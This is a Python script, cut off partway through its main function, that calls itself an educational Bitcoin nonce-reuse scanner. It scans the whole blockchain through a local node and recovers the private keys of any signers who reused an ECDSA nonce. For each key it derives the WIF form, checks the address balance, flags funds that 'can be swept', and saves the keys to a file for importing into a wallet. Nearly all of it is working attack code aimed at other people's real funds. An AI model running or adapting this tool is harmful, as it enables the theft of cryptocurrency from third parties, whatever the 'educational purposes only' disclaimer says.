#!/usr/bin/env python3
"""
Bitcoin Reused Nonce Scanner

This educational tool scans the Bitcoin blockchain for ECDSA signatures that
reuse the same nonce (k value). When the same nonce is used twice with the 
same private key, the private key can be mathematically recovered.

The vulnerability: In ECDSA, if k is reused:
  signature1 = (r, s1) for message hash z1
  signature2 = (r, s2) for message hash z2
  
If r is the same (meaning k was reused):
  k = (z1 - z2) / (s1 - s2) mod n
  private_key = (s * k - z) / r mod n

This has resulted in real funds being stolen throughout Bitcoin's history.
"""

import argparse
import json
import logging
import sys
from collections import defaultdict
from decimal import Decimal, getcontext, InvalidOperation, ROUND_HALF_UP
from pathlib import Path
from typing import Dict, List, Tuple, Optional, Set
from bitcoinrpc.authproxy import AuthServiceProxy, JSONRPCException
import hashlib
import binascii
import base58
import struct

# Configure decimal context to handle Bitcoin's precision
ctx = getcontext()
ctx.prec = 50
ctx.Emax = 999999
ctx.Emin = -999999
ctx.rounding = ROUND_HALF_UP
ctx.traps[InvalidOperation] = 0

# Monkey-patch json module to parse floats as Decimal
_original_loads = json.loads

def _patched_loads(*args, **kwargs):
    """Parse JSON with float values as Decimal to avoid precision issues."""
    kwargs['parse_float'] = Decimal
    try:
        return _original_loads(*args, **kwargs)
    except InvalidOperation:
        kwargs.pop('parse_float', None)
        return _original_loads(*args, **kwargs)

json.loads = _patched_loads


# Secp256k1 curve parameters
CURVE_ORDER = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

# SIGHASH types
SIGHASH_ALL = 0x01
SIGHASH_NONE = 0x02
SIGHASH_SINGLE = 0x03
SIGHASH_ANYONECANPAY = 0x80


def serialize_varint(n: int) -> bytes:
    """Serialize an integer as a Bitcoin variable-length integer."""
    if n < 0xfd:
        return struct.pack('<B', n)
    elif n <= 0xffff:
        return b'\xfd' + struct.pack('<H', n)
    elif n <= 0xffffffff:
        return b'\xfe' + struct.pack('<I', n)
    else:
        return b'\xff' + struct.pack('<Q', n)


def serialize_script(script_hex: str) -> bytes:
    """Serialize a script with its length prefix."""
    script_bytes = bytes.fromhex(script_hex)
    return serialize_varint(len(script_bytes)) + script_bytes


def serialize_outpoint(txid: str, vout: int) -> bytes:
    """Serialize a transaction outpoint (previous tx reference)."""
    # Reverse the txid (Bitcoin uses little-endian for hashes)
    txid_bytes = bytes.fromhex(txid)[::-1]
    vout_bytes = struct.pack('<I', vout)
    return txid_bytes + vout_bytes


def calculate_sighash_segwit(tx: dict, input_idx: int, script_code: str,
                            value: int, sighash_type: int) -> int:
    """
    Calculate sighash for SegWit transaction (BIP143).
    
    Args:
        tx: Full transaction dictionary
        input_idx: Index of input being signed
        script_code: Script code (for P2WPKH, this is the P2PKH equivalent)
        value: Value of the output being spent (in satoshis)
        sighash_type: SIGHASH type byte
    
    Returns:
        Sighash as integer
    """
    base_sighash = sighash_type & 0x1f
    anyonecanpay = sighash_type & SIGHASH_ANYONECANPAY
    
    # Start building the preimage
    preimage = b''
    
    # 1. nVersion (4 bytes)
    preimage += struct.pack('<I', tx.get('version', 1))
    
    # 2. hashPrevouts (32 bytes)
    if not anyonecanpay:
        prevouts = b''
        for inp in tx['vin']:
            if 'coinbase' not in inp:
                prevouts += serialize_outpoint(inp['txid'], inp['vout'])
        hashPrevouts = hashlib.sha256(hashlib.sha256(prevouts).digest()).digest()
    else:
        hashPrevouts = b'\x00' * 32
    preimage += hashPrevouts
    
    # 3. hashSequence (32 bytes)
    if not anyonecanpay and base_sighash != SIGHASH_SINGLE and base_sighash != SIGHASH_NONE:
        sequences = b''
        for inp in tx['vin']:
            if 'coinbase' not in inp:
                sequences += struct.pack('<I', inp.get('sequence', 0xffffffff))
        hashSequence = hashlib.sha256(hashlib.sha256(sequences).digest()).digest()
    else:
        hashSequence = b'\x00' * 32
    preimage += hashSequence
    
    # 4. outpoint (32 + 4 bytes)
    tx_input = tx['vin'][input_idx]
    preimage += serialize_outpoint(tx_input['txid'], tx_input['vout'])
    
    # 5. scriptCode
    preimage += serialize_script(script_code)
    
    # 6. value (8 bytes)
    preimage += struct.pack('<Q', value)
    
    # 7. nSequence (4 bytes)
    preimage += struct.pack('<I', tx_input.get('sequence', 0xffffffff))
    
    # 8. hashOutputs (32 bytes)
    if base_sighash != SIGHASH_SINGLE and base_sighash != SIGHASH_NONE:
        outputs = b''
        for output in tx['vout']:
            value_satoshis = int(float(output['value']) * 100000000)
            outputs += struct.pack('<Q', value_satoshis)
            outputs += serialize_script(output['scriptPubKey']['hex'])
        hashOutputs = hashlib.sha256(hashlib.sha256(outputs).digest()).digest()
    elif base_sighash == SIGHASH_SINGLE and input_idx < len(tx['vout']):
        output = tx['vout'][input_idx]
        value_satoshis = int(float(output['value']) * 100000000)
        output_bytes = struct.pack('<Q', value_satoshis)
        output_bytes += serialize_script(output['scriptPubKey']['hex'])
        hashOutputs = hashlib.sha256(hashlib.sha256(output_bytes).digest()).digest()
    else:
        hashOutputs = b'\x00' * 32
    preimage += hashOutputs
    
    # 9. nLocktime (4 bytes)
    preimage += struct.pack('<I', tx.get('locktime', 0))
    
    # 10. sighash type (4 bytes)
    preimage += struct.pack('<I', sighash_type)
    
    # Double SHA256
    hash_result = hashlib.sha256(hashlib.sha256(preimage).digest()).digest()
    
    return int.from_bytes(hash_result, byteorder='big')


def calculate_sighash_legacy(tx: dict, input_idx: int, script_code: str, 
                             sighash_type: int) -> int:
    """
    Calculate the sighash for a legacy (non-SegWit) transaction.
    
    Args:
        tx: Full transaction dictionary from RPC
        input_idx: Index of the input being signed
        script_code: Script to use for this input (usually previous output's scriptPubKey)
        sighash_type: The SIGHASH type byte
    
    Returns:
        The sighash as an integer
    """
    # Start with version
    serialized = struct.pack('<I', tx.get('version', 1))
    
    # Serialize inputs
    base_sighash = sighash_type & 0x1f
    anyonecanpay = sighash_type & SIGHASH_ANYONECANPAY
    
    if anyonecanpay:
        # Only serialize the input being signed
        serialized += serialize_varint(1)
        tx_input = tx['vin'][input_idx]
        serialized += serialize_outpoint(tx_input['txid'], tx_input['vout'])
        serialized += serialize_script(script_code)
        serialized += struct.pack('<I', tx_input.get('sequence', 0xffffffff))
    else:
        # Serialize all inputs
        serialized += serialize_varint(len(tx['vin']))
        for i, tx_input in enumerate(tx['vin']):
            if 'coinbase' in tx_input:
                # Skip coinbase inputs
                continue
                
            serialized += serialize_outpoint(tx_input['txid'], tx_input['vout'])
            
            if i == input_idx:
                # This is the input being signed - use the script_code
                serialized += serialize_script(script_code)
            else:
                # Other inputs - use empty script
                serialized += serialize_varint(0)
            
            # Sequence
            if base_sighash == SIGHASH_NONE or base_sighash == SIGHASH_SINGLE:
                if i != input_idx:
                    serialized += struct.pack('<I', 0)
                else:
                    serialized += struct.pack('<I', tx_input.get('sequence', 0xffffffff))
            else:
                serialized += struct.pack('<I', tx_input.get('sequence', 0xffffffff))
    
    # Serialize outputs
    if base_sighash == SIGHASH_NONE:
        # No outputs
        serialized += serialize_varint(0)
    elif base_sighash == SIGHASH_SINGLE:
        # Only output at same index as input
        if input_idx >= len(tx['vout']):
            # Bug case: return the error value
            return 1
        
        serialized += serialize_varint(input_idx + 1)
        
        # Null outputs before the one we care about
        for i in range(input_idx):
            serialized += struct.pack('<q', -1)  # -1 as signed 64-bit = 0xffffffffffffffff
            serialized += serialize_varint(0)
        
        # The actual output
        output = tx['vout'][input_idx]
        value_satoshis = int(float(output['value']) * 100000000)
        serialized += struct.pack('<Q', value_satoshis)
        serialized += serialize_script(output['scriptPubKey']['hex'])
        
    else:  # SIGHASH_ALL
        # All outputs
        serialized += serialize_varint(len(tx['vout']))
        for output in tx['vout']:
            value_satoshis = int(float(output['value']) * 100000000)
            serialized += struct.pack('<Q', value_satoshis)
            serialized += serialize_script(output['scriptPubKey']['hex'])
    
    # Locktime
    serialized += struct.pack('<I', tx.get('locktime', 0))
    
    # Sighash type (4 bytes)
    serialized += struct.pack('<I', sighash_type)
    
    # Double SHA256
    hash_result = hashlib.sha256(hashlib.sha256(serialized).digest()).digest()
    
    return int.from_bytes(hash_result, byteorder='big')


def private_key_to_wif(private_key: int, compressed: bool = True, testnet: bool = False) -> str:
    """
    Convert a private key integer to WIF (Wallet Import Format).
    
    Args:
        private_key: Private key as integer
        compressed: Whether to use compressed format (default True)
        testnet: Whether this is for testnet (default False - mainnet)
    
    Returns:
        WIF-encoded private key string
    """
    # Convert private key to 32 bytes
    private_key_bytes = private_key.to_bytes(32, byteorder='big')
    
    # Add version byte (0x80 for mainnet, 0xef for testnet)
    version_byte = b'\xef' if testnet else b'\x80'
    extended_key = version_byte + private_key_bytes
    
    # Add compression flag if compressed
    if compressed:
        extended_key += b'\x01'
    
    # Calculate checksum (double SHA256)
    checksum = hashlib.sha256(hashlib.sha256(extended_key).digest()).digest()[:4]
    
    # Append checksum
    final_key = extended_key + checksum
    
    # Encode in Base58
    wif = base58.b58encode(final_key).decode('ascii')
    
    return wif


def public_key_to_address(public_key_hex: str, testnet: bool = False) -> str:
    """
    Convert a public key to a Bitcoin address (P2PKH).
    
    Args:
        public_key_hex: Public key as hex string
        testnet: Whether this is for testnet (default False - mainnet)
    
    Returns:
        Bitcoin address string
    """
    try:
        public_key_bytes = bytes.fromhex(public_key_hex)
        
        # SHA256 hash
        sha256_hash = hashlib.sha256(public_key_bytes).digest()
        
        # RIPEMD160 hash
        ripemd160 = hashlib.new('ripemd160')
        ripemd160.update(sha256_hash)
        pubkey_hash = ripemd160.digest()
        
        # Add version byte (0x00 for mainnet, 0x6f for testnet)
        version_byte = b'\x6f' if testnet else b'\x00'
        versioned_hash = version_byte + pubkey_hash
        
        # Calculate checksum
        checksum = hashlib.sha256(hashlib.sha256(versioned_hash).digest()).digest()[:4]
        
        # Append checksum
        address_bytes = versioned_hash + checksum
        
        # Encode in Base58
        address = base58.b58encode(address_bytes).decode('ascii')
        
        return address
        
    except Exception as e:
        logging.error(f"Error converting public key to address: {e}")
        return None


def private_key_to_public_key(private_key: int) -> Optional[str]:
    """
    Derive public key from private key using secp256k1.
    
    Args:
        private_key: Private key as integer
    
    Returns:
        Public key as hex string (compressed format), or None on error
    """
    try:
        from ecdsa import SigningKey, SECP256k1
        
        # Convert private key to bytes
        private_key_bytes = private_key.to_bytes(32, byteorder='big')
        
        # Create signing key
        sk = SigningKey.from_string(private_key_bytes, curve=SECP256k1)
        
        # Get verifying (public) key
        vk = sk.get_verifying_key()
        
        # Get compressed public key
        public_key_bytes = vk.to_string()
        x = int.from_bytes(public_key_bytes[:32], byteorder='big')
        y = int.from_bytes(public_key_bytes[32:], byteorder='big')
        
        # Compressed format: 0x02 if y is even, 0x03 if y is odd, followed by x
        prefix = b'\x02' if y % 2 == 0 else b'\x03'
        compressed_pubkey = prefix + x.to_bytes(32, byteorder='big')
        
        return compressed_pubkey.hex()
        
    except Exception as e:
        logging.error(f"Error deriving public key: {e}")
        return None


class SignatureInfo:
    """Information about an ECDSA signature."""
    
    def __init__(self, r: int, s: int, z: int, txid: str, input_idx: int, 
                 pubkey: str, address: str = None):
        self.r = r  # R value of signature
        self.s = s  # S value of signature  
        self.z = z  # Message hash (sighash)
        self.txid = txid
        self.input_idx = input_idx
        self.pubkey = pubkey  # Public key
        self.address = address  # Bitcoin address


class BitcoinNonceScanner:
    """Scanner for reused nonces in Bitcoin ECDSA signatures."""
    
    def __init__(self, rpc_url: str, rpc_user: str = None, rpc_password: str = None):
        """
        Initialize the scanner with RPC connection details.
        
        Args:
            rpc_url: URL of Bitcoin RPC server
            rpc_user: RPC username
            rpc_password: RPC password
        """
        if rpc_user and rpc_password:
            connection_str = f"http://{rpc_user}:{rpc_password}@{rpc_url.replace('http://', '')}"
        else:
            connection_str = rpc_url
        
        try:
            self.rpc = AuthServiceProxy(connection_str, timeout=120)
        except Exception as e:
            logging.error(f"Failed to create RPC connection: {e}")
            raise
        
        # Store signatures grouped by r value
        self.signatures_by_r: Dict[int, List[SignatureInfo]] = defaultdict(list)
        
        # Store recovered private keys
        self.recovered_keys: List[Tuple[int, str, List[SignatureInfo]]] = []
        
        # Track unique r values we've seen
        self.seen_r_values: Set[int] = set()
        
        # Cache for fetched transactions
        self.tx_cache: Dict[str, dict] = {}
        
        # Test connection
        try:
            self.rpc.getblockchaininfo()
            logging.info("✅ Successfully connected to Bitcoin RPC")
        except Exception as e:
            logging.error(f"Failed to test RPC connection: {e}")
            raise
    
    def get_block_height(self) -> int:
        """Get the current blockchain height."""
        try:
            blockchain_info = self.rpc.getblockchaininfo()
            return blockchain_info['blocks']
        except Exception as e:
            logging.error(f"Failed to fetch blockchain height: {e}")
            raise
    
    def scan_blockchain(self, start_height: int = 0, end_height: Optional[int] = None):
        """
        Scan the blockchain for reused nonces.
        
        Args:
            start_height: Block height to start scanning from
            end_height: Block height to end scanning at (None = current height)
        """
        if end_height is None:
            end_height = self.get_block_height()
        
        logging.info(f"Starting nonce reuse scan from block {start_height} to {end_height}")
        logging.info(f"Total blocks to scan: {end_height - start_height + 1}")
        
        for height in range(start_height, end_height + 1):
            if height % 500 == 0:
                logging.info(f"Progress: Block {height}/{end_height} | "
                           f"Unique R values: {len(self.signatures_by_r)} | "
                           f"Keys recovered: {len(self.recovered_keys)}")
            
            try:
                self._scan_block(height)
            except JSONRPCException as e:
                logging.error(f"Error scanning block {height}: {e}")
                continue
            except Exception as e:
                logging.error(f"Unexpected error at block {height}: {e}")
                continue
        
        logging.info("=" * 80)
        logging.info(f"Scan complete! Summary:")
        logging.info(f"  Blocks scanned: {end_height - start_height + 1}")
        logging.info(f"  Unique signatures found: {len(self.signatures_by_r)}")
        logging.info(f"  Private keys recovered: {len(self.recovered_keys)}")
        logging.info("=" * 80)
        
        # Report findings
        if self.recovered_keys:
            self._report_recovered_keys()
        else:
            logging.info("No reused nonces found in scanned range.")
    
    def _scan_block(self, height: int):
        """Scan a single block for signatures."""
        try:
            block_hash = self.rpc.getblockhash(height)
            block = self.rpc.getblock(block_hash, 2)  # Verbosity 2 = include transactions
        except JSONRPCException as e:
            logging.error(f"Failed to get block at height {height}: {e}")
            raise
        
        # Skip coinbase transaction
        for tx in block['tx'][1:]:
            self._process_transaction(tx, height)
    
    def _get_transaction(self, txid: str) -> Optional[dict]:
        """
        Fetch a transaction from the blockchain (with caching).
        
        Args:
            txid: Transaction ID
            
        Returns:
            Transaction dict or None
        """
        if txid in self.tx_cache:
            return self.tx_cache[txid]
        
        try:
            tx = self.rpc.getrawtransaction(txid, True)
            self.tx_cache[txid] = tx
            return tx
        except Exception as e:
            logging.debug(f"Failed to fetch transaction {txid}: {e}")
            return None
    
    def _process_transaction(self, tx: dict, block_height: int):
        """Extract and analyze signatures from a transaction."""
        txid = tx['txid']
        
        for input_idx, tx_input in enumerate(tx['vin']):
            # Skip coinbase inputs
            if 'coinbase' in tx_input:
                continue
            
            # Extract signature from scriptSig
            sig_info = self._extract_signature(tx, tx_input, input_idx)
            
            if sig_info is None:
                continue
            
            # Check if we've seen this R value before
            if sig_info.r in self.seen_r_values:
                # Potential nonce reuse! Try to recover private key
                logging.warning(f"⚠️  Potential nonce reuse detected! R value: {hex(sig_info.r)[:20]}...")
                logging.warning(f"   Transaction: {txid}, Input: {input_idx}, Block: {block_height}")
                
                # Try to recover private key
                self._attempt_key_recovery(sig_info)
            
            # Store signature indexed by R value
            self.signatures_by_r[sig_info.r].append(sig_info)
            self.seen_r_values.add(sig_info.r)
    
    def _extract_signature(self, tx: dict, tx_input: dict, input_idx: int) -> Optional[SignatureInfo]:
        """
        Extract ECDSA signature components from transaction input and calculate real sighash.
        
        Args:
            tx: Full transaction dict
            tx_input: Specific input dict
            input_idx: Index of this input
        
        Returns:
            SignatureInfo object or None if extraction fails
        """
        # Check for witness data (SegWit)
        witness = tx_input.get('txinwitness', [])
        is_segwit = len(witness) > 0
        
        script_sig_hex = tx_input.get('scriptSig', {}).get('hex', '')
        
        try:
            # Get the previous output
            prev_txid = tx_input['txid']
            prev_vout = tx_input['vout']
            
            prev_tx = self._get_transaction(prev_txid)
            if prev_tx is None:
                logging.debug(f"Could not fetch previous tx {prev_txid}")
                return None
            
            if prev_vout >= len(prev_tx['vout']):
                return None
            
            prev_output = prev_tx['vout'][prev_vout]
            script_pubkey = prev_output['scriptPubKey']['hex']
            script_pubkey_type = prev_output['scriptPubKey'].get('type', '')
            value_btc = prev_output['value']
            value_satoshis = int(float(value_btc) * 100000000)
            
            # Parse based on type
            if is_segwit and len(witness) >= 2:
                # SegWit transaction
                # For P2WPKH: witness = [signature, pubkey]
                # For P2WSH: witness = [signature, ..., redeemScript]
                
                sig_hex = witness[0]
                sig_bytes = bytes.fromhex(sig_hex)
                
                # Parse signature
                r, s, sig_end, sighash_type = self._parse_der_signature(sig_bytes)
                if r is None or s is None:
                    return None
                
                # Get public key
                if script_pubkey_type == 'witness_v0_keyhash':
                    # P2WPKH - pubkey is second witness element
                    pubkey = witness[1]
                else:
                    # P2WSH or other - try to extract pubkey
                    pubkey = witness[1] if len(witness) > 1 else None
                
                if not pubkey:
                    return None
                
                # Calculate script code for P2WPKH
                # For P2WPKH, script_code is: OP_DUP OP_HASH160 <pubkey_hash> OP_EQUALVERIFY OP_CHECKSIG
                if script_pubkey_type == 'witness_v0_keyhash':
                    # Extract the pubkey hash from scriptPubKey
                    # P2WPKH scriptPubKey: OP_0 <20-byte-hash>
                    script_pubkey_bytes = bytes.fromhex(script_pubkey)
                    if len(script_pubkey_bytes) == 22 and script_pubkey_bytes[0] == 0x00:
                        pubkey_hash = script_pubkey_bytes[2:22]
                        # Construct P2PKH equivalent script
                        script_code = '76a914' + pubkey_hash.hex() + '88ac'
                    else:
                        logging.debug(f"Unexpected P2WPKH scriptPubKey format")
                        return None
                else:
                    # P2WSH or unknown - use witness script
                    script_code = witness[-1] if len(witness) > 2 else script_pubkey
                
                # Calculate BIP143 sighash
                z = calculate_sighash_segwit(tx, input_idx, script_code, value_satoshis, sighash_type)
                
            else:
                # Legacy transaction
                if not script_sig_hex:
                    return None
                
                script_bytes = bytes.fromhex(script_sig_hex)
                
                # Parse DER-encoded signature
                r, s, sig_end, sighash_type = self._parse_der_signature(script_bytes)
                if r is None or s is None:
                    return None
                
                # Extract public key (usually after signature)
                pubkey = self._extract_pubkey(script_bytes, sig_end)
                if pubkey is None:
                    return None
                
                # Legacy sighash
                z = calculate_sighash_legacy(tx, input_idx, script_pubkey, sighash_type)
            
            # Derive address from previous output
            address = prev_output['scriptPubKey'].get('address') or prev_output['scriptPubKey'].get('addresses', [None])[0]
            
            return SignatureInfo(r, s, z, tx['txid'], input_idx, pubkey, address)
            
        except Exception as e:
            # Log for debugging but don't crash
            logging.debug(f"Error extracting signature from {tx.get('txid', 'unknown')}: {e}")
            return None
    
    def _parse_der_signature(self, script_bytes: bytes) -> Tuple[Optional[int], Optional[int], int, int]:
        """
        Parse DER-encoded ECDSA signature.
        
        Returns:
            Tuple of (r, s, end_position, sighash_type) or (None, None, 0, 0) on failure
        """
        try:
            if len(script_bytes) < 8:
                return None, None, 0, 0
            
            pos = 0
            
            # First byte is signature length (push opcode)
            if script_bytes[pos] < 0x01 or script_bytes[pos] > 0x4b:
                # Could be direct DER without push opcode
                pos = 0
            else:
                pos = 1
            
            # DER signature format: 0x30 [total-length] 0x02 [R-length] [R] 0x02 [S-length] [S] [sighash]
            if script_bytes[pos] != 0x30:
                return None, None, 0, 0
            
            pos += 1
            sig_length = script_bytes[pos]
            pos += 1
            
            # Parse R
            if script_bytes[pos] != 0x02:
                return None, None, 0, 0
            pos += 1
            
            r_length = script_bytes[pos]
            pos += 1
            
            r = int.from_bytes(script_bytes[pos:pos + r_length], byteorder='big')
            pos += r_length
            
            # Parse S
            if script_bytes[pos] != 0x02:
                return None, None, 0, 0
            pos += 1
            
            s_length = script_bytes[pos]
            pos += 1
            
            s = int.from_bytes(script_bytes[pos:pos + s_length], byteorder='big')
            pos += s_length
            
            # Get sighash byte
            sighash_type = script_bytes[pos] if pos < len(script_bytes) else SIGHASH_ALL
            pos += 1
            
            return r, s, pos, sighash_type
            
        except (IndexError, ValueError):
            return None, None, 0, 0
    
    def _extract_pubkey(self, script_bytes: bytes, offset: int) -> Optional[str]:
        """Extract public key from script."""
        try:
            if offset >= len(script_bytes):
                return None
            
            # Public key length
            pubkey_len = script_bytes[offset]
            
            if pubkey_len in (33, 65):  # Compressed or uncompressed pubkey
                pubkey_bytes = script_bytes[offset + 1:offset + 1 + pubkey_len]
                if len(pubkey_bytes) == pubkey_len:
                    return pubkey_bytes.hex()
            
            return None
            
        except (IndexError, ValueError):
            return None
    
    
    def _attempt_key_recovery(self, new_sig: SignatureInfo):
        """
        Attempt to recover private key when nonce reuse is detected.
        
        Args:
            new_sig: The new signature with reused R value
        """
        # Get all signatures with the same R value
        previous_sigs = self.signatures_by_r[new_sig.r]
        
        for prev_sig in previous_sigs:
            # Don't compare signature to itself
            if prev_sig.txid == new_sig.txid and prev_sig.input_idx == new_sig.input_idx:
                continue
            
            # Attempt recovery
            private_key = self._recover_private_key(prev_sig, new_sig)
            
            if private_key is not None:
                logging.critical("🔥🔥🔥 PRIVATE KEY RECOVERED! 🔥🔥🔥")
                logging.critical(f"   Private Key: {hex(private_key)}")
                logging.critical(f"   Public Key: {new_sig.pubkey}")
                logging.critical(f"   Signature 1: TX {prev_sig.txid}, Input {prev_sig.input_idx}")
                logging.critical(f"   Signature 2: TX {new_sig.txid}, Input {new_sig.input_idx}")
                
                # Store recovered key with additional info
                wif_key = private_key_to_wif(private_key, compressed=True)
                address = public_key_to_address(new_sig.pubkey) if new_sig.pubkey else None
                
                self.recovered_keys.append({
                    'private_key': private_key,
                    'private_key_wif': wif_key,
                    'public_key': new_sig.pubkey,
                    'address': address,
                    'signatures': [prev_sig, new_sig]
                })
                
                # Check balance
                self._check_balance(address, private_key, wif_key)
                
                return
    
    def _recover_private_key(self, sig1: SignatureInfo, sig2: SignatureInfo) -> Optional[int]:
        """
        Recover private key from two signatures with same k.
        
        Math:
            k = (z1 - z2) * inverse(s1 - s2) mod n
            private_key = (s * k - z) * inverse(r) mod n
        
        Returns:
            Private key as integer, or None if recovery fails
        """
        try:
            r = sig1.r
            s1 = sig1.s
            s2 = sig2.s
            z1 = sig1.z
            z2 = sig2.z
            
            # Calculate k
            s_diff = (s1 - s2) % CURVE_ORDER
            z_diff = (z1 - z2) % CURVE_ORDER
            
            # Need modular inverse
            s_diff_inv = self._mod_inverse(s_diff, CURVE_ORDER)
            if s_diff_inv is None:
                return None
            
            k = (z_diff * s_diff_inv) % CURVE_ORDER
            
            # Calculate private key
            r_inv = self._mod_inverse(r, CURVE_ORDER)
            if r_inv is None:
                return None
            
            private_key = ((s1 * k - z1) * r_inv) % CURVE_ORDER
            
            # Verify the key is valid (not zero)
            if private_key == 0:
                return None
            
            return private_key
            
        except Exception as e:
            logging.debug(f"Key recovery failed: {e}")
            return None
    
    def _mod_inverse(self, a: int, m: int) -> Optional[int]:
        """Calculate modular multiplicative inverse using extended Euclidean algorithm."""
        if a < 0:
            a = (a % m + m) % m
        
        g, x, _ = self._extended_gcd(a, m)
        
        if g != 1:
            return None
        
        return x % m
    
    def _extended_gcd(self, a: int, b: int) -> Tuple[int, int, int]:
        """Extended Euclidean algorithm."""
        if a == 0:
            return b, 0, 1
        
        gcd, x1, y1 = self._extended_gcd(b % a, a)
        x = y1 - (b // a) * x1
        y = x1
        
        return gcd, x, y
    
    def _check_balance(self, address: str, private_key: int, wif_key: str):
        """Check if the recovered private key controls any funds."""
        try:
            if not address:
                logging.info(f"   Cannot check balance: address derivation failed")
                return
            
            logging.info(f"   Checking balance for address: {address}")
            
            # Try to get balance using Bitcoin Core's scantxoutset
            # This requires Bitcoin Core 0.17.0+
            try:
                result = self.rpc.scantxoutset("start", [f"addr({address})"])
                
                if result and 'total_amount' in result:
                    total_btc = float(result['total_amount'])
                    
                    if total_btc > 0:
                        logging.critical(f"   💰💰💰 FUNDS FOUND! 💰💰💰")
                        logging.critical(f"   Balance: {total_btc} BTC")
                        logging.critical(f"   Address: {address}")
                        logging.critical(f"   Private Key (WIF): {wif_key}")
                        logging.critical(f"   ⚠️  These funds are vulnerable and can be swept!")
                    else:
                        logging.info(f"   Balance: 0 BTC (no funds)")
                else:
                    logging.info(f"   Balance: 0 BTC (no UTXOs found)")
                    
            except Exception as e:
                # Fallback: Try listunspent if address is imported
                logging.debug(f"scantxoutset failed: {e}")
                logging.info(f"   Balance check unavailable (requires Bitcoin Core 0.17+)")
                logging.info(f"   Check manually: https://blockstream.info/address/{address}")
            
        except Exception as e:
            logging.error(f"Error checking balance: {e}")
    
    def _report_recovered_keys(self):
        """Generate detailed report of all recovered private keys."""
        logging.info("\n" + "=" * 80)
        logging.info("RECOVERED PRIVATE KEYS REPORT")
        logging.info("=" * 80)
        
        for idx, key_info in enumerate(self.recovered_keys, 1):
            privkey = key_info['private_key']
            wif_key = key_info['private_key_wif']
            pubkey = key_info['public_key']
            address = key_info['address']
            sigs = key_info['signatures']
            
            logging.info(f"\n[{idx}] Private Key Recovered:")
            logging.info(f"    Private Key (hex): {hex(privkey)}")
            logging.info(f"    Private Key (WIF): {wif_key}")
            logging.info(f"    Public Key: {pubkey}")
            
            if address:
                logging.info(f"    Bitcoin Address: {address}")
                logging.info(f"    Check balance: https://blockstream.info/address/{address}")
            
            logging.info(f"    Reused in {len(sigs)} signatures:")
            
            for sig in sigs:
                logging.info(f"      - TX: {sig.txid}")
                logging.info(f"        Input: {sig.input_idx}")
                logging.info(f"        Explorer: https://blockstream.info/tx/{sig.txid}")
        
        logging.info("\n" + "=" * 80)
        logging.info("⚠️  WARNING: These private keys were vulnerable due to nonce reuse.")
        logging.info("    Any funds controlled by these keys are at risk of theft!")
        logging.info("=" * 80)
        
        # Save to file for easy access
        self._save_recovered_keys()
    
    def _save_recovered_keys(self):
        """Save recovered keys to a JSON file."""
        if not self.recovered_keys:
            return
        
        try:
            output_file = Path("recovered_keys.json")
            
            # Convert to serializable format
            output_data = []
            for key_info in self.recovered_keys:
                output_data.append({
                    'private_key_hex': hex(key_info['private_key']),
                    'private_key_wif': key_info['private_key_wif'],
                    'public_key': key_info['public_key'],
                    'address': key_info['address'],
                    'transactions': [
                        {
                            'txid': sig.txid,
                            'input_idx': sig.input_idx,
                            'explorer_url': f"https://blockstream.info/tx/{sig.txid}"
                        }
                        for sig in key_info['signatures']
                    ]
                })
            
            with open(output_file, 'w') as f:
                json.dump(output_data, f, indent=2)
            
            logging.info(f"\n📁 Recovered keys saved to: {output_file.absolute()}")
            logging.info(f"   You can import these keys into a Bitcoin wallet using the WIF format.")
            
        except Exception as e:
            logging.error(f"Error saving recovered keys: {e}")


def find_bitcoin_cookie(bitcoin_dir: Optional[Path] = None) -> Path:
    """Find the Bitcoin cookie file for authentication."""
    if bitcoin_dir is None:
        home = Path.home()
        if sys.platform == 'win32':
            bitcoin_dir = home / 'AppData' / 'Roaming' / 'Bitcoin'
        else:
            bitcoin_dir = home / '.bitcoin'
    
    cookie_path = bitcoin_dir / '.cookie'
    
    if not cookie_path.exists():
        raise FileNotFoundError(
            f"Cookie file not found at {cookie_path}. "
            "Make sure your Bitcoin node is running, or specify --bitcoin-dir"
        )
    
    return cookie_path


def parse_cookie_file(cookie_path: Path) -> Tuple[str, str]:
    """Parse Bitcoin cookie file to get RPC credentials."""
    try:
        cookie_content = cookie_path.read_text().strip()
        username, password = cookie_content.split(':', 1)
        return username, password
    except Exception as e:
        raise ValueError(f"Failed to parse cookie file {cookie_path}: {e}")


def setup_logging(log_file: Optional[Path] = None):
    """Configure logging to file or stderr."""
    log_format = '%(asctime)s - %(levelname)s - %(message)s'
    
    if log_file:
        logging.basicConfig(
            level=logging.INFO,
            format=log_format,
            filename=log_file,
            filemode='a'
        )
        print(f"Logging to file: {log_file}")
    else:
        logging.basicConfig(
            level=logging.INFO,
            format=log_format,
            stream=sys.stderr
        )


def main():
    """Main entry point for the scanner."""
    parser = argparse.ArgumentParser(
        description='Bitcoin Reused Nonce Scanner - Find ECDSA Nonce Reuse Vulnerabilities',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Example usage:
  %(prog)s --address 127.0.0.1:8332 --start-height 0 --end-height 100000
  %(prog)s --address 127.0.0.1:8332 --log-file nonce_scan.log
  
This tool scans for reused ECDSA nonces that allow private key recovery.
When the same nonce is used twice, the private key can be mathematically
calculated, leading to complete loss of funds.

Known vulnerable periods:
  - 2010-2012: Early Bitcoin software bugs
  - 2013: Blockchain.info Android wallet bug
  - 2014-2015: Various hardware wallet bugs
  
Educational purposes only. Do not use for malicious purposes.
        """
    )
    
    parser.add_argument(
        '--address',
        default='127.0.0.1:8332',
        help='Bitcoin RPC server address (default: 127.0.0.1:8332)'
    )
    
    parser.add_argument(
        '--bitcoin-dir',
        type=Path,
        help='Bitcoin data directory (for cookie authentication)'
    )
    
    parser.add_argument(
        '--log-file',
        type=Path,
        help='Log file path (default: log to stderr)'
    )
    
    parser.add_argument(
        '--start-height',
        type=int,
        default=0,
        help='Starting block height (default: 0)'
    )
    
    parser.add_argument(
        '--end-height',
        type=int,
        help='Ending block height (default: current blockchain height)'
    )
    
    args = parser.parse_args()
    
    # Setup logging
    setup_logging(args.log_file)
    
    logging.info("=" * 80)
    logging.info("Bitcoin Reused Nonce Scanner - Educational Tool")
    logging.info("=" * 80)
    
    # Prepare RPC URL
    if not args.address.startswith('http'):
        rpc_url = f"http://{args.address}"
    else:
        rpc_url = args.address
    
    # Get authentication from cookie file
    try:
        cookie_path = find_bitcoin_cookie(args.bitcoin_dir)
        rpc_user, rpc_password = parse_cookie_file(cookie_path)
        logging.info(f"Using cookie authentication from {cookie_path}")
    except (FileNotFoundError, ValueError) as e:
